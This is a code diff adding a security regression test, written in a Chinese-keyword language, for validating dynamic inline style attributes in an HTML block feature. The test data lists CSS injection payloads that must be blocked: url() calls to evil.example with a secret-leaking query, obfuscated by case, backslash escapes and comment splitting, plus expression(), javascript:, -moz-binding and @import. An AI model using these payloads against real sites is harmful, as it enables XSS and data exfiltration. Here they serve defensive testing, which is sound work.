@@ -75,5 +75,54 @@
     }
     如果 (已拒绝 == 0) { 抛出 "动态 srcdoc 未被拒绝"; }
 
+    查动态style();
     打印行("HTML Block 安全回归测试通过");
+}
+
+// ── 动态 style ──────────────────────────────────────────────────
+//
+// 这一项以前是一句「请改用 class」全拒。理由对（属性里的 CSS 有自己一套
+// 转义规则），但结论过头：位置、进度条宽度、用户选的颜色天生是「每个元素
+// 一份的数值」，塞不进固定的 class。逼急了人会自己拼一段 <style> 注进去，
+// 那比放开 style **危险得多**。
+//
+// 现在是校验后放行。下面这批用例就是那道校验的契约 ——
+// 放行的少一条是功能倒退，拦住的漏一条是 XSS。
+函数 查动态style() {
+    // 该放行：数值、单位、颜色、calc/rgb/translate、font 简写里的斜杠
+    好样式("left:62%;top:55%");
+    好样式("width:calc(100% - 24px)");
+    好样式("background:rgba(0,0,0,.4)");
+    好样式("font:12px/1.5 sans-serif");
+    好样式("transform:translate(-50%,-50%)");
+
+    // 该拦住。前四条是同一个 url( 的四种写法 —— 少了任何一层防线就漏一个：
+    //   直接写 / 大小写 / 反斜杠转义藏起来 / 注释劈开
+    坏样式("background:url(//evil.example/?c=secret)", "url 外链");
+    坏样式("background:URL(//evil.example/x)", "url 大写");
+    坏样式("background:\\75 rl(//evil.example/x)", "反斜杠转义");
+    坏样式("background:ur/**/l(//evil.example/x)", "注释劈开");
+    坏样式("width:expression(alert(1))", "IE expression");
+    坏样式("background:javascript:alert(1)", "javascript 协议");
+    坏样式("-moz-binding:url(//evil.example/x.xml)", "moz-binding");
+    坏样式("@import '//evil.example/x.css'", "@import");
+    坏样式("width:10px;<script>", "尖括号");
+}
+
+函数 好样式(值: 字符串) {
+    尝试 {
+        块属性(创建块("div"), "style", 值);
+    } 捕获 错误: 字符串 {
+        抛出 "动态 style 不该拦「" + 值 + "」：" + 错误;
+    }
+}
+
+函数 坏样式(值: 字符串, 名称: 字符串) {
+    变量 拦了: 整数 = 0;
+    尝试 {
+        块属性(创建块("div"), "style", 值);
+    } 捕获 错误: 字符串 {
+        拦了 = 1;
+    }
+    如果 (拦了 == 0) { 抛出 "动态 style 漏了「" + 名称 + "」：" + 值; }
 }
